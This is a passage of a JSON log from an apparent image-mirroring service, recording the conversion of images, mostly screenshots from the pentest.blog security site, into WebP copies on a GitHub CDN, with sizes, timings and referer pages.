KB","compressRate":"67.8%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/init-1.png","sourceStatusCode":200,"destWidth":911,"destHeight":378,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn71@2020_3/2020/08/25/01-41-47-043_ec9f790f0c377a42.webp","sourceBytes":100957,"destBytes":64126,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1689,"convertSpendMs":35,"createdTime":"2020-08-25 09:41:46","host":"europe-57*","referer":"https://pentest.blog/?p=2182","linkMd5ListStr":"6e8364b2bd7691fdf6e9b97b38fddee5","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"98.6 KB","destSize":"62.6 KB","compressRate":"63.5%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/vestacp-3-1.png","sourceStatusCode":200,"destWidth":2332,"destHeight":1218,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn68@2020_5/2020/08/25/01-41-47-148_1872cf95827f789e.webp","sourceBytes":745918,"destBytes":96594,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1946,"convertSpendMs":119,"createdTime":"2020-08-25 09:41:46","host":"europe69*","referer":"https://pentest.blog/?p=2453","linkMd5ListStr":"fd88f7ad07bdc8fa1d2b7b147e3a9a42","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"728.4 KB","destSize":"94.3 KB","compressRate":"12.9%"},{"code":1,"isDone":false,"source":"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f600.png","sourceStatusCode":200,"destWidth":72,"destHeight":72,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn48@2020_3/2020/08/25/01-41-47-982_10c092881059b63a.webp","sourceBytes":806,"destBytes":1564,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":791,"convertSpendMs":6,"createdTime":"2020-08-25 09:41:47","host":"us-031*","referer":"https://pentest.blog/?p=1631","linkMd5ListStr":"f88146d0e07e8038814706acd9dc7e6b,f88146d0e07e8038814706acd9dc7e6b","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"806 B","destSize":"1.5 KB","compressRate":"194%"},{"code":1,"isDone":false,"source":"https://github.com/EgeBalci/MSF-Self-Defense/raw/master/poc.gif","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":11893,"totalSpendMs":421,"convertSpendMs":0,"createdTime":"2020-08-25 09:41:48","host":"europe61*","referer":"https://pentest.blog/?p=1631","linkMd5ListStr":"f88146d0e07e8038814706acd9dc7e6b","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/screenshot_4-1024x442.png","sourceStatusCode":200,"destWidth":1024,"destHeight":442,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn27@2020_2/2020/08/25/01-41-48-227_3b7b899cb8c580b0.webp","sourceBytes":385151,"destBytes":48508,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1353,"convertSpendMs":43,"createdTime":"2020-08-25 09:41:47","host":"us-027*","referer":"https://pentest.blog/?p=1631","linkMd5ListStr":"f88146d0e07e8038814706acd9dc7e6b","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"376.1 KB","destSize":"47.4 KB","compressRate":"12.6%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/yes.gif","sourceStatusCode":200,"destWidth":200,"destHeight":270,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn88@2020_1/2020/08/25/01-41-47-939_c218bbe9d2fc0196.webp","sourceBytes":1119292,"destBytes":237196,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":2472,"convertSpendMs":318,"createdTime":"2020-08-25 09:41:46","host":"us-018*","referer":"https://pentest.blog/?p=1502","linkMd5ListStr":"da37f1bd44fa53bee31361a590ff07a1","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"1.1 MB","destSize":"231.6 KB","compressRate":"21.2%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/hydra_time.png","sourceStatusCode":200,"destWidth":504,"destHeight":53,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn71@2020_2/2020/08/25/01-41-48-420_7a725a19a44fdc7a.webp","sourceBytes":6534,"destBytes":6242,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1124,"convertSpendMs":4,"createdTime":"2020-08-25 09:41:48","host":"us-023*","referer":"https://pentest.blog/?p=2182","linkMd5ListStr":"6e8364b2bd7691fdf6e9b97b38fddee5","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"6.4 KB","destSize":"6.1 KB","compressRate":"95.5%"},{"code":1,"isDone":false,"source":"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f641.png","sourceStatusCode":200,"destWidth":72,"destHeight":72,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn83@2020_3/2020/08/25/01-41-48-191_4120538b5839114f.webp","sourceBytes":609,"destBytes":1382,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1084,"convertSpendMs":4,"createdTime":"2020-08-25 09:41:48","host":"europe61*","referer":"https://pentest.blog/?p=1502","linkMd5ListStr":"da37f1bd44fa53bee31361a590ff07a1","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"609 B","destSize":"1.3 KB","compressRate":"226.9%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/ImageExportDescriptor.png","sourceStatusCode":200,"destWidth":789,"destHeight":548,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn31@2020_4/2020/08/25/01-41-48-341_37a8b66df4604e87.webp","sourceBytes":61682,"destBytes":22436,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1329,"convertSpendMs":48,"createdTime":"2020-08-25 09:41:47","host":"us-014*","referer":"https://pentest.blog/?p=1299","linkMd5ListStr":"1cb4056b55bc4aa1e4174035918387a5","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"60.2 KB","destSize":"21.9 KB","compressRate":"36.4%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/dex_ff-1.png","sourceStatusCode":200,"destWidth":648,"destHeight":294,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn44@2020_4/2020/08/25/01-41-48-331_2b5a720d1d681916.webp","sourceBytes":38374,"destBytes":24252,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1339,"convertSpendMs":14,"createdTime":"2020-08-25 09:41:47","host":"us-53*","referer":"https://pentest.blog/?p=2182","linkMd5ListStr":"6e8364b2bd7691fdf6e9b97b38fddee5","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"37.5 KB","destSize":"23.7 KB","compressRate":"63.2%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/screenshot_7.png","sourceStatusCode":200,"destWidth":980,"destHeight":387,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn40@2020_2/2020/08/25/01-41-48-168_3371b003448c675f.webp","sourceBytes":43667,"destBytes":31158,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1269,"convertSpendMs":23,"createdTime":"2020-08-25 09:41:47","host":"europe65*","referer":"https://pentest.blog/?p=2407","linkMd5ListStr":"c887d466f740d170459712bf8a263e8b","githubUser":"myreaderx23","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"42.6 KB","destSize":"30.4 KB","compressRate":"71.4%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/solve.png","sourceStatusCode":200,"destWidth":594,"destHeight":91,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn88@2020_2/2020/08/25/01-41-48-566_586964589dff276d.webp","sourceBytes":22543,"destBytes":12768,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1246,"convertSpendMs":18,"createdTime":"2020-08-25 09:41:48","host":"us-039*","referer":"https://pentest.blog/?p=1502","linkMd5ListStr":"da37f1bd44fa53bee31361a590ff07a1","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"22 KB","destSize":"12.5 KB","compressRate":"56.6%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/jadx-3.png","sourceStatusCode":200,"destWidth":960,"destHeight":484,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn68@2020_2/2020/08/25/01-41-48-397_0aa9c023a483a745.webp","sourceBytes":112871,"destBytes":59292,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1346,"convertSpendMs":39,"createdTime":"2020-08-25 09:41:47","host":"us-035*","referer":"https://pentest.blog/?p=2182","linkMd5ListStr":"6e8364b2bd7691fdf6e9b97b38fddee5","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"110.2 KB","destSize":"57.9 KB","compressRate":"52.5%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/gg3.png","sourceStatusCode":200,"destWidth":602,"destHeight":877,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn59@2020_6/2020/08/25/01-41-48-188_6234b6118de594dc.webp","sourceBytes":112384,"destBytes":31590,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1324,"convertSpendMs":25,"createdTime":"2020-08-25 09:41:47","host":"europe69*","referer":"https://pentest.blog/?p=1502","linkMd5ListStr":"da37f1bd44fa53bee31361a590ff07a1","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"109.8 KB","destSize":"30.8 KB","compressRate":"28.1%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/tadaa_1.png","sourceStatusCode":200,"destWidth":853,"destHeight":536,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn51@2020_4/2020/08/25/01-41-48-564_2c53ad92bce463aa.webp","sourceBytes":49692,"destBytes":69820,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1527,"convertSpendMs":46,"createdTime":"2020-08-25 09:41:47","host":"us-018*","referer":"https://pentest.blog/?p=1502","linkMd5ListStr":"da37f1bd44fa53bee31361a590ff07a1","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"48.5 KB","destSize":"68.2 KB","compressRate":"140.5%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/gg1.png","sourceStatusCode":200,"destWidth":594,"destHeight":955,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn36@2020_3/2020/08/25/01-41-48-614_408c0c507674f550.webp","sourceBytes":216993,"destBytes":62318,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1596,"convertSpendMs":46,"createdTime":"2020-08-25 09:41:47","host":"us-002*","referer":"https://pentest.blog/?p=1502","linkMd5ListStr":"da37f1bd44fa53bee31361a590ff07a1","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"211.9 KB","destSize":"60.9 KB","compressRate":"28.7%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/screenshot-1.png","sourceStatusCode":200,"destWidth":912,"destHeight":696,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn64@2020_4/2020/08/25/01-41-48-241_8c437602395b6427.webp","sourceBytes":68959,"destBytes":41842,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1424,"convertSpendMs":27,"createdTime":"2020-08-25 09:41:48","host":"europe-57*","referer":"https://pentest.blog/?p=2407","linkMd5ListStr":"c887d466f740d170459712bf8a263e8b","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"67.3 KB","destSize":"40.9 KB","compressRate":"60.7%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/Peek-2019-07-16-13-37.gif","sourceStatusCode":200,"destWidth":1489,"destHeight":661,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn83@2020_4/2020/08/25/01-41-48-376_25da7cdb62d5392f.webp","sourceBytes":560833,"destBytes":267922,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":2885,"convertSpendMs":1298,"createdTime":"2020-08-25 09:41:46","host":"us-031*","referer":"https://pentest.blog/?p=1631","linkMd5ListStr":"f88146d0e07e8038814706acd9dc7e6b","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"547.7 KB","destSize":"261.6 KB","compressRate":"47.8%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/gg2.png","sourceStatusCode":200,"destWidth":611,"destHeight":914,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn80@2020_2/2020/08/25/01-41-48-368_2df77b27b30b5f86.webp","sourceBytes":233146,"destBytes":61418,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1493,"convertSpendMs":30,"createdTime":"2020-08-25 09:41:48","host":"europe-23*","referer":"https://pentest.blog/?p=1502","linkMd5ListStr":"da37f1bd44fa53bee31361a590ff07a1","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"227.7 KB","destSize":"60 KB","compressRate":"26.3%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/mzw9z.gif","sourceStatusCode":200,"destWidth":500,"destHeight":345,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn56@2020_6/2020/08/25/01-41-49-021_f398abf9ec133225.webp","sourceBytes":345352,"destBytes":82156,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":2103,"convertSpendMs":227,"createdTime":"2020-08-25 09:41:47","host":"us-006*","referer":"https://pentest.blog/?p=1502","linkMd5ListStr":"da37f1bd44fa53bee31361a590ff07a1","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"337.3 KB","destSize":"80.2 KB","compressRate":"23.8%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/Peek-2019-07-16-13-39.gif","sourceStatusCode":200,"destWidth":1103,"destHeight":524,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn16@2020_5/2020/08/25/01-41-50-214_573f98dd9e8b0e8c.webp","sourceBytes":99941,"destBytes":75748,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":5069,"convertSpendMs":3253,"createdTime":"2020-08-25 09:41:46","host":"europe-23*","referer":"https://pentest.blog/?p=1631","linkMd5ListStr":"f88146d0e07e8038814706acd9dc7e6b","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"97.6 KB","destSize":"74 KB","compressRate":"75.8%"}],"successGithubMap":{"myreaderx8":3,"myreaderx14":2,"myreaderx15":3,"myreaderx7":2,"myreaderx16":2,"myreaderx6":2,"myreaderx10":2,"myreaderx4":2,"myreaderx32":2,"myreaderx11":3,"myreaderx33":2,"myreaderx3":2,"myreaderx12":2,"myreaderx2":2,"myreaderx1":2,"myreaderx13":1,"myreaderx30":2,"myreaderx31":2,"myreaderx18":2,"myreaderx19":3,"myreaderx":2,"myreaderx25":2,"myreaderx27":2,"myreaderx21":3,"myreaderx22":2,"myreaderx23":2,"myreaderx24":3,"myreaderx5oss":3,"myreaderx29":1},"failGithubMap":{}}